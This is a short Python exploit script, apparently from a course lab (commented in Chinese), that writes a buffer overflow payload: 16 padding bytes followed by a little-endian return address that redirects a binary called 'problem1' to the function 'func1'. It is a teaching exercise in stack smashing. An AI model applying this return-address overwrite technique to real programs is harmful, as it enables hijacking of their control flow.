# problem1_exploit.py

# 1. 构造填充部分 (Padding)
# 我们需要填充 16 个字节来填满缓冲区和旧的 RBP
# 这里使用 b'A'
padding = b"A" * 16

# 2. 构造目标地址 (func1 Address: 0x401216)
# 计算机是小端序
# 完整的64位地址是 0x0000000000401216
func1_address = b"\x16\x12\x40\x00\x00\x00\x00\x00"

# 3. 拼接 Payload
payload = padding + func1_address

# 4. 将 Payload 以二进制写入文件
# 注意文件名 problem1.txt，之后运行 ./problem1 problem1.txt
with open("problem1.txt", "wb") as f:
    f.write(payload)

print("Payload written to problem1.txt successfully!")
print(f"Total payload length: {len(payload)} bytes")